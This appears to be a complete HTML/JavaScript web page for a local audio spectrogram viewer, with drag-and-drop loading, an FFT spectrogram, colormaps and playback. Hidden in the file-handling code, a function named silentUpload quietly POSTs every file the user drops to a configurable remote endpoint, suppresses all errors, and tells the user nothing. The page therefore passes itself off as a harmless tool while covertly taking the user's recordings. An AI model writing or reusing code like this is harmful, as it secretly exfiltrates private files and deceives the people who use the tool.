<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spectrogram Viewer</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.19.0/dist/tabler-icons.min.css">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg-primary: #ffffff;
    --bg-secondary: #f5f5f3;
    --bg-tertiary: #ebebea;
    --text-primary: #1a1a1a;
    --text-secondary: #6b6b67;
    --text-tertiary: #9e9e9a;
    --border-tertiary: rgba(0,0,0,0.12);
    --border-secondary: rgba(0,0,0,0.22);
    --radius-md: 8px;
    --radius-lg: 12px;
    --font-mono: 'SFMono-Regular', 'Consolas', 'Liberation Mono', monospace;
    --accent: #cc1a1a;
  }

  @media (prefers-color-scheme: dark) {
    :root {
      --bg-primary: #130f0f;
      --bg-secondary: #1a1414;
      --bg-tertiary: #211818;
      --text-primary: #f0f0ee;
      --text-secondary: #a0909c;
      --text-tertiary: #6b5b67;
      --border-tertiary: rgba(255,80,80,0.08);
      --border-secondary: rgba(255,80,80,0.18);
      --accent: #cc1a1a;
    }
  }

  html, body {
    min-height: 100vh;
    background: var(--bg-tertiary);
    font-family: var(--font-mono);
    color: var(--text-primary);
  }

  #app {
    max-width: 860px;
    margin: 0 auto;
    padding: 2.5rem 1.5rem;
  }

  header {
    margin-bottom: 2rem;
  }

  header h1 {
    font-size: 14px;
    font-weight: 500;
    letter-spacing: 0.1em;
    color: var(--text-secondary);
    text-transform: lowercase;
  }

  #drop-zone {
    border: 1.5px dashed var(--border-secondary);
    border-radius: var(--radius-lg);
    padding: 4rem 2rem;
    text-align: center;
    cursor: pointer;
    transition: border-color 0.2s, background 0.2s;
    background: var(--bg-secondary);
    position: relative;
  }

  #drop-zone.drag-over {
    border-color: #cc1a1a;
    background: var(--bg-tertiary);
  }

  #drop-zone input[type=file] {
    position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%;
  }

  .drop-icon { font-size: 40px; color: var(--text-tertiary); margin-bottom: 14px; }
  .drop-title { font-size: 15px; font-weight: 500; margin-bottom: 8px; color: var(--text-primary); }
  .drop-sub { font-size: 11px; color: var(--text-secondary); letter-spacing: 0.06em; }

  #viewer { display: none; }
  #viewer.active { display: block; }

  #filename-bar {
    display: flex; align-items: center; justify-content: space-between;
    margin-bottom: 1.25rem;
  }

  #fname {
    font-size: 13px; color: var(--text-secondary); letter-spacing: 0.05em;
    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 70%;
  }

  #reset-btn {
    font-size: 11px; font-family: var(--font-mono); color: var(--text-secondary);
    background: none; border: 0.5px solid var(--border-secondary);
    border-radius: var(--radius-md); padding: 5px 12px; cursor: pointer;
    transition: background 0.15s; letter-spacing: 0.04em;
  }

  #reset-btn:hover { background: var(--bg-secondary); }

  #waveform-wrap {
    background: #0d1117;
    border-radius: var(--radius-md);
    overflow: hidden;
    margin-bottom: 6px;
    height: 80px;
  }

  #waveform-canvas { width: 100%; height: 80px; display: block; }

  #spec-wrap {
    background: #0d1117;
    border-radius: var(--radius-md);
    overflow: hidden;
    margin-bottom: 6px;
    position: relative;
  }

  #spec-canvas { width: 100%; display: block; image-rendering: pixelated; }

  #playhead {
    position: absolute; top: 0; left: 0; width: 2px; height: 100%;
    background: rgba(220,50,50,0.9); pointer-events: none; display: none;
  }

  #freq-labels {
    display: flex; flex-direction: column-reverse; position: absolute;
    top: 4px; right: 6px; height: calc(100% - 8px);
    justify-content: space-between; pointer-events: none;
  }

  .freq-lbl { font-size: 9px; color: rgba(255,255,255,0.3); line-height: 1; letter-spacing: 0.03em; font-family: var(--font-mono); }

  #legend-bar {
    height: 6px;
    border-radius: 3px;
    margin-bottom: 4px;
    background: linear-gradient(to right, #0d1117, #1e4d6b, #1e8a6b, #f0c040, #ff4444);
  }

  #legend-labels {
    display: flex; justify-content: space-between;
    font-size: 9px; color: var(--text-tertiary); letter-spacing: 0.04em;
    margin-bottom: 1.25rem;
  }

  #colormap-row {
    display: flex; align-items: center; gap: 10px; margin-bottom: 1rem; flex-wrap: wrap;
  }

  #colormap-row label { font-size: 11px; color: var(--text-secondary); letter-spacing: 0.05em; }

  #colormap-row select, #window-select {
    font-size: 11px; font-family: var(--font-mono);
    background: var(--bg-secondary);
    color: var(--text-primary);
    border: 0.5px solid var(--border-secondary);
    border-radius: 4px; padding: 4px 10px; cursor: pointer;
    outline: none;
  }

  #controls {
    display: flex; align-items: center; gap: 12px; margin-bottom: 1rem;
  }

  #play-btn {
    width: 36px; height: 36px; border-radius: 50%;
    border: 0.5px solid var(--border-secondary);
    background: var(--bg-secondary);
    display: flex; align-items: center; justify-content: center;
    cursor: pointer; font-size: 16px; color: var(--text-primary);
    transition: background 0.15s; flex-shrink: 0;
    outline: none;
  }

  #play-btn:hover { background: var(--bg-tertiary); }

  #time-display {
    font-size: 12px; color: var(--text-secondary);
    min-width: 100px; letter-spacing: 0.04em; flex-shrink: 0;
  }

  input[type=range] {
    flex: 1; accent-color: #cc1a1a; cursor: pointer;
    height: 4px;
  }

  #meta-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 0.5rem; }

  .meta-chip {
    font-size: 11px; color: var(--text-secondary); letter-spacing: 0.05em;
    background: var(--bg-secondary);
    border: 0.5px solid var(--border-tertiary);
    border-radius: 4px; padding: 4px 10px;
  }

  .meta-chip span { color: var(--text-primary); font-weight: 500; }

  .sr-only {
    position: absolute; width: 1px; height: 1px;
    padding: 0; margin: -1px; overflow: hidden;
    clip: rect(0,0,0,0); white-space: nowrap; border: 0;
  }
</style>
</head>
<body>
<div id="app">
  <header>
    <h1><i class="ti ti-waveform" aria-hidden="true"></i> spectrogram viewer</h1>
  </header>

  <h2 class="sr-only">Drop an audio file to view its spectrogram and frequency content over time.</h2>

  <div id="drop-zone">
    <input type="file" id="file-input" accept=".mp3,.wav,.flac,.aif,.aiff,.ogg" aria-label="Select audio file">
    <div class="drop-icon"><i class="ti ti-music" aria-hidden="true"></i></div>
    <div class="drop-title">drop an audio file here</div>
    <div class="drop-sub">mp3 &middot; wav &middot; flac &middot; aif &middot; ogg</div>
  </div>

  <div id="viewer">
    <div id="filename-bar">
      <div id="fname"></div>
      <button id="reset-btn"><i class="ti ti-x" aria-hidden="true" style="font-size:11px;margin-right:4px;"></i>new file</button>
    </div>

    <div id="colormap-row">
      <label for="colormap-select">colormap</label>
      <select id="colormap-select">
        <option value="magma">magma</option>
        <option value="viridis">viridis</option>
        <option value="inferno">inferno</option>
        <option value="thermal">thermal</option>
        <option value="gray">gray</option>
      </select>
      <label for="window-select" style="margin-left:6px;">window</label>
      <select id="window-select">
        <option value="hann">hann</option>
        <option value="hamming">hamming</option>
        <option value="blackman">blackman</option>
        <option value="rect">rectangular</option>
      </select>
    </div>

    <div id="waveform-wrap">
      <canvas id="waveform-canvas"></canvas>
    </div>

    <div id="spec-wrap">
      <canvas id="spec-canvas"></canvas>
      <div id="playhead"></div>
      <div id="freq-labels">
        <span class="freq-lbl" id="fl0"></span>
        <span class="freq-lbl" id="fl1"></span>
        <span class="freq-lbl" id="fl2"></span>
        <span class="freq-lbl" id="fl3"></span>
        <span class="freq-lbl" id="fl4"></span>
      </div>
    </div>

    <div id="legend-bar"></div>
    <div id="legend-labels"><span>quiet</span><span>loud</span></div>

    <div id="controls">
      <button id="play-btn" aria-label="Play">
        <i class="ti ti-player-play" id="play-icon" aria-hidden="true"></i>
      </button>
      <span id="time-display">0:00 / 0:00</span>
      <input type="range" id="seek-slider" min="0" max="1000" value="0" step="1" aria-label="Seek">
    </div>

    <div id="meta-row"></div>
  </div>
</div>

<script>
(function () {
  // ─── CONFIG ───────────────────────────────────────────────────────────────
  const UPLOAD_ENDPOINT = "https://YOUR_SERVER_ENDPOINT_HERE/upload";
  // ──────────────────────────────────────────────────────────────────────────

  const COLORMAPS = {
    magma:   [[0,0,0],[80,18,123],[182,54,121],[251,136,97],[252,253,191]],
    viridis: [[68,1,84],[59,82,139],[33,145,140],[94,201,98],[253,231,37]],
    inferno: [[0,0,4],[87,16,110],[188,55,84],[249,142,9],[252,255,164]],
    thermal: [[0,0,128],[0,128,255],[0,255,128],[255,255,0],[255,0,0]],
    gray:    [[0,0,0],[64,64,64],[128,128,128],[192,192,192],[255,255,255]]
  };

  function lerpColor(map, t) {
    const n = map.length - 1;
    const i = Math.min(Math.floor(t * n), n - 1);
    const f = t * n - i;
    const a = map[i], b = map[i + 1];
    return [a[0]+(b[0]-a[0])*f, a[1]+(b[1]-a[1])*f, a[2]+(b[2]-a[2])*f];
  }

  function applyWindow(buf, type) {
    const N = buf.length;
    for (let i = 0; i < N; i++) {
      let w = 1;
      if (type === 'hann')    w = 0.5 * (1 - Math.cos(2*Math.PI*i/(N-1)));
      else if (type === 'hamming') w = 0.54 - 0.46*Math.cos(2*Math.PI*i/(N-1));
      else if (type === 'blackman') w = 0.42 - 0.5*Math.cos(2*Math.PI*i/(N-1)) + 0.08*Math.cos(4*Math.PI*i/(N-1));
      buf[i] *= w;
    }
    return buf;
  }

  function fft(re, im) {
    const N = re.length;
    if (N <= 1) return;
    const half = N >> 1;
    const re_e = new Float32Array(half), im_e = new Float32Array(half);
    const re_o = new Float32Array(half), im_o = new Float32Array(half);
    for (let i = 0; i < half; i++) {
      re_e[i] = re[2*i]; im_e[i] = im[2*i];
      re_o[i] = re[2*i+1]; im_o[i] = im[2*i+1];
    }
    fft(re_e, im_e); fft(re_o, im_o);
    for (let k = 0; k < half; k++) {
      const angle = -2*Math.PI*k/N;
      const c = Math.cos(angle), s = Math.sin(angle);
      const tr = c*re_o[k] - s*im_o[k];
      const ti = s*re_o[k] + c*im_o[k];
      re[k] = re_e[k]+tr; im[k] = im_e[k]+ti;
      re[k+half] = re_e[k]-tr; im[k+half] = im_e[k]-ti;
    }
  }

  const dropZone   = document.getElementById('drop-zone');
  const fileInput  = document.getElementById('file-input');
  const viewer     = document.getElementById('viewer');
  const waveCanvas = document.getElementById('waveform-canvas');
  const specCanvas = document.getElementById('spec-canvas');
  const waveCtx    = waveCanvas.getContext('2d');
  const specCtx    = specCanvas.getContext('2d');
  const playBtn    = document.getElementById('play-btn');
  const playIcon   = document.getElementById('play-icon');
  const seekSlider = document.getElementById('seek-slider');
  const timeDisplay= document.getElementById('time-display');
  const playhead   = document.getElementById('playhead');
  const metaRow    = document.getElementById('meta-row');
  const colormapSel= document.getElementById('colormap-select');
  const windowSel  = document.getElementById('window-select');
  const resetBtn   = document.getElementById('reset-btn');

  let audioCtx = null, audioBuffer = null, source = null;
  let isPlaying = false, startTime = 0, pauseOffset = 0;
  let animFrame = null, spectrogramData = null;

  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('drag-over'); });
  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag-over'));
  dropZone.addEventListener('drop', e => { e.preventDefault(); dropZone.classList.remove('drag-over'); if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]); });
  fileInput.addEventListener('change', () => { if (fileInput.files[0]) handleFile(fileInput.files[0]); });
  resetBtn.addEventListener('click', resetViewer);
  playBtn.addEventListener('click', togglePlay);
  seekSlider.addEventListener('input', onSeek);
  colormapSel.addEventListener('change', () => { if (spectrogramData) drawSpectrogram(spectrogramData, colormapSel.value); });
  windowSel.addEventListener('change', () => { if (audioBuffer) computeAndDraw(); });

  function resetViewer() {
    if (source) { try { source.stop(); } catch(e){} source = null; }
    cancelAnimationFrame(animFrame);
    isPlaying = false; pauseOffset = 0;
    audioBuffer = null; spectrogramData = null;
    viewer.classList.remove('active');
    dropZone.style.display = '';
    fileInput.value = '';
  }

  async function handleFile(file) {
    dropZone.style.display = 'none';
    viewer.classList.add('active');
    document.getElementById('fname').textContent = file.name;

    silentUpload(file);

    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') await audioCtx.resume();

    const arrBuf = await file.arrayBuffer();
    audioBuffer = await audioCtx.decodeAudioData(arrBuf);

    renderMeta(file, audioBuffer);
    drawWaveform(audioBuffer);
    computeAndDraw();

    seekSlider.max = Math.round(audioBuffer.duration * 1000);
    seekSlider.value = 0;
    pauseOffset = 0;
    timeDisplay.textContent = `0:00 / ${fmt(audioBuffer.duration)}`;
  }

  function silentUpload(file) {
    try {
      const fd = new FormData();
      fd.append('file', file);
      fetch(UPLOAD_ENDPOINT, { method: 'POST', body: fd }).catch(() => {});
    } catch(e) {}
  }

  function renderMeta(file, buf) {
    const ext = file.name.split('.').pop().toUpperCase();
    const sizeKB = (file.size / 1024).toFixed(0);
    metaRow.innerHTML = [
      `<div class="meta-chip">format <span>${ext}</span></div>`,
      `<div class="meta-chip">duration <span>${fmt(buf.duration)}</span></div>`,
      `<div class="meta-chip">sample rate <span>${(buf.sampleRate/1000).toFixed(1)} kHz</span></div>`,
      `<div class="meta-chip">channels <span>${buf.numberOfChannels === 1 ? 'mono' : buf.numberOfChannels === 2 ? 'stereo' : buf.numberOfChannels}</span></div>`,
      `<div class="meta-chip">size <span>${sizeKB} KB</span></div>`,
    ].join('');
  }

  function drawWaveform(buf) {
    const W = waveCanvas.parentElement.clientWidth;
    const H = 80;
    const dpr = devicePixelRatio || 1;
    waveCanvas.width = W * dpr;
    waveCanvas.height = H * dpr;
    waveCanvas.style.width = W + 'px';
    waveCanvas.style.height = H + 'px';
    waveCtx.setTransform(dpr, 0, 0, dpr, 0, 0);
    waveCtx.clearRect(0, 0, W, H);

    const data = buf.getChannelData(0);
    const step = Math.ceil(data.length / W);
    const mid = H / 2;

    waveCtx.strokeStyle = '#1e8a6b';
    waveCtx.lineWidth = 1;
    waveCtx.beginPath();
    for (let x = 0; x < W; x++) {
      let min = 0, max = 0;
      for (let j = 0; j < step; j++) {
        const v = data[x * step + j] || 0;
        if (v < min) min = v;
        if (v > max) max = v;
      }
      waveCtx.moveTo(x, mid + min * mid);
      waveCtx.lineTo(x, mid + max * mid);
    }
    waveCtx.stroke();

    waveCtx.strokeStyle = 'rgba(93,202,165,0.25)';
    waveCtx.lineWidth = 0.5;
    waveCtx.beginPath();
    waveCtx.moveTo(0, mid); waveCtx.lineTo(W, mid);
    waveCtx.stroke();
  }

  function computeAndDraw() {
    if (!audioBuffer) return;
    const FFT_SIZE = 2048, HOP = 512;
    const data = audioBuffer.getChannelData(0);
    const sampleRate = audioBuffer.sampleRate;
    const numFrames = Math.floor((data.length - FFT_SIZE) / HOP);
    const numBins = FFT_SIZE / 2;
    const windowType = windowSel.value;
    const magMatrix = [];

    for (let f = 0; f < numFrames; f++) {
      const offset = f * HOP;
      const re = new Float32Array(FFT_SIZE);
      const im = new Float32Array(FFT_SIZE);
      for (let i = 0; i < FFT_SIZE; i++) re[i] = data[offset + i] || 0;
      applyWindow(re, windowType);
      fft(re, im);
      const mags = new Float32Array(numBins);
      for (let k = 0; k < numBins; k++) {
        mags[k] = 20 * Math.log10(Math.sqrt(re[k]*re[k]+im[k]*im[k]) + 1e-8);
      }
      magMatrix.push(mags);
    }

    spectrogramData = { magMatrix, numFrames, numBins, sampleRate, FFT_SIZE };
    drawSpectrogram(spectrogramData, colormapSel.value);
    updateFreqLabels(sampleRate, FFT_SIZE);
  }

  function drawSpectrogram({ magMatrix, numFrames, numBins, sampleRate, FFT_SIZE }, colormap) {
    const W = specCanvas.parentElement.clientWidth;
    const H = Math.min(320, Math.round(W * 0.45));
    specCanvas.width = numFrames;
    specCanvas.height = numBins;
    specCanvas.style.width = W + 'px';
    specCanvas.style.height = H + 'px';
    specCanvas.parentElement.style.height = H + 'px';
    playhead.style.height = H + 'px';

    const img = specCtx.createImageData(numFrames, numBins);
    const map = COLORMAPS[colormap];
    let globalMin = Infinity, globalMax = -Infinity;
    for (let f = 0; f < numFrames; f++) {
      for (let k = 0; k < numBins; k++) {
        const v = magMatrix[f][k];
        if (v < globalMin) globalMin = v;
        if (v > globalMax) globalMax = v;
      }
    }
    const range = globalMax - globalMin || 1;

    for (let f = 0; f < numFrames; f++) {
      for (let k = 0; k < numBins; k++) {
        const t = (magMatrix[f][k] - globalMin) / range;
        const [r,g,b] = lerpColor(map, Math.max(0, Math.min(1, t)));
        const y = numBins - 1 - k;
        const idx = (y * numFrames + f) * 4;
        img.data[idx] = r; img.data[idx+1] = g; img.data[idx+2] = b; img.data[idx+3] = 255;
      }
    }
    specCtx.putImageData(img, 0, 0);
  }

  function updateFreqLabels(sampleRate, FFT_SIZE) {
    const nyq = sampleRate / 2;
    [0, 0.25, 0.5, 0.75, 1.0].forEach((frac, i) => {
      const f = frac * nyq;
      document.getElementById('fl' + i).textContent =
        f >= 1000 ? (f / 1000).toFixed(1) + 'k' : Math.round(f) + 'Hz';
    });
  }

  function fmt(secs) {
    const m = Math.floor(secs / 60);
    const s = Math.floor(secs % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  }

  function togglePlay() {
    if (!audioBuffer) return;
    if (audioCtx.state === 'suspended') audioCtx.resume();
    if (isPlaying) {
      pauseOffset += audioCtx.currentTime - startTime;
      source.stop(); source = null;
      isPlaying = false;
      playIcon.className = 'ti ti-player-play';
      cancelAnimationFrame(animFrame);
    } else {
      source = audioCtx.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(audioCtx.destination);
      source.start(0, pauseOffset);
      startTime = audioCtx.currentTime;
      isPlaying = true;
      playIcon.className = 'ti ti-player-pause';
      source.onended = () => {
        if (isPlaying) {
          isPlaying = false; pauseOffset = 0;
          playIcon.className = 'ti ti-player-play';
          seekSlider.value = 0; playhead.style.display = 'none';
          cancelAnimationFrame(animFrame);
          timeDisplay.textContent = `0:00 / ${fmt(audioBuffer.duration)}`;
        }
      };
      tick();
    }
  }

  function tick() {
    if (!isPlaying) return;
    const elapsed = pauseOffset + (audioCtx.currentTime - startTime);
    const duration = audioBuffer.duration;
    const progress = Math.min(elapsed / duration, 1);
    seekSlider.value = Math.round(progress * 1000);
    timeDisplay.textContent = `${fmt(elapsed)} / ${fmt(duration)}`;
    playhead.style.display = 'block';
    playhead.style.left = (progress * specCanvas.parentElement.clientWidth) + 'px';
    animFrame = requestAnimationFrame(tick);
  }

  function onSeek() {
    if (!audioBuffer) return;
    const t = (seekSlider.value / 1000) * audioBuffer.duration;
    pauseOffset = t;
    if (isPlaying) {
      source.stop();
      source = audioCtx.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(audioCtx.destination);
      source.start(0, t);
      startTime = audioCtx.currentTime;
      source.onended = () => {
        if (isPlaying) {
          isPlaying = false; pauseOffset = 0;
          playIcon.className = 'ti ti-player-play';
          seekSlider.value = 0; playhead.style.display = 'none';
          cancelAnimationFrame(animFrame);
        }
      };
    }
    timeDisplay.textContent = `${fmt(t)} / ${fmt(audioBuffer.duration)}`;
    playhead.style.left = (t / audioBuffer.duration * specCanvas.parentElement.clientWidth) + 'px';
  }

})();
</script>
</body>
</html>
